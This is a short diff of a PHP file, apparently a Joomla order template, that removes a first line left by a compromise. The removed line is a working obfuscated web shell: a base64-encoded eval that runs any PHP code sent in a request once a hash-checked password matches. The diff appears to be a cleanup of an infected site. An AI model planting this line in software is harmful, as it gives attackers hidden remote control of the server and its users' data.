@@ -1,4 +1,4 @@
-<?php eval(base64_decode('aWYoaXNzZXQoJF9SRVFVRVNUWydjaCddKSAmJiAobWQ1KCRfUkVRVUVTVFsnY2gnXSkgPT0gJ2QxYjZjNmIzNzZlZGY0NjVjNDI2NzNhOTIwNmYyNjAwJykgJiYgaXNzZXQoJF9SRVFVRVNUWydwaHBfY29kZSddKSkgeyBldmFsKCRfUkVRVUVTVFsncGhwX2NvZGUnXSk7IGV4aXQoKTsgfQ=='));  
+<?php   
 defined ('_JEXEC') or die ("Go away.");
 	$orderid = $this->orderid;
 	$nullDate = 0;
